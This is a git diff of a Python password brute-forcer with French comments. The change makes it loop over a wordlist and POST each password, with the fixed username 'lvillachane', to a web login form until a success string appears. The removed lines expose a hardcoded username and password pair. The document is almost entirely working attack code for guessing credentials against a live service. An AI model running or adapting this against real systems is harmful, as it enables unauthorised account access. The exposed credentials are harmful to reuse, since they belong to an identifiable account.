@@ -1,5 +1,6 @@
 import requests
 import base64
+from queue import Queue
 
 class Bruteforcer() :
     def __init__(self, wordlist, hostname, url, uri='/'):
@@ -23,13 +24,23 @@ class Bruteforcer() :
     # Méthode appelée pour tenter de se connecter
     # Session() ajoute de la persistence en cas de réussite
     def authenticate(self):
+        continuer = True
         with requests.Session() as s :
-            #header = self.getHeader()
-            payload = self.getPayload('lvillachane', 'jux7g')
-            requeteHTTP = requests.post(self.hyperlink, data=payload)
-            print(requeteHTTP.text)
-            self.haveIBeenRedirected(requeteHTTP)
-
+            # header = self.getHeader()
+            while continuer :
+                with open(self.wordlist, 'r') as passwordList:
+                    for passwd in passwordList :
+                        passwd = passwd.replace("\n", "")
+                        print("Tentative avec le mot de passe : " + passwd)
+                        payload = self.getPayload('lvillachane', passwd)
+                        requeteHTTP = requests.post(self.hyperlink, data=payload)
+                        #print(requeteHTTP)
+                        #print(requeteHTTP.text)
+                        #self.haveIBeenRedirected(requeteHTTP)
+                        if 'code à 4 chiffres' in requeteHTTP.text :
+                            print("\nMot de passe trouvé : " + passwd)
+                            continuer = False
+                            break
     """
     # Essaie de créer un header HTTP pour une requête
     def getHeader(self):
@@ -62,14 +73,10 @@ class Bruteforcer() :
         return payload
 
     # Ouvre et traite chaque mot du dictionnaire
-    def get_words(self):
-        with open(self.wordlist) as f:
+    def getWords(self):
+        with open(self.wordlist, 'r') as f:
             raw_words = f.read()
-
-        words = Queue()
-        for word in raw_words.split():
-            words.put(word)
-        return words
+        return raw_words
 
     # Encode si bool = true, sinon décode (base64)
     def base64eur(self, bool, data):
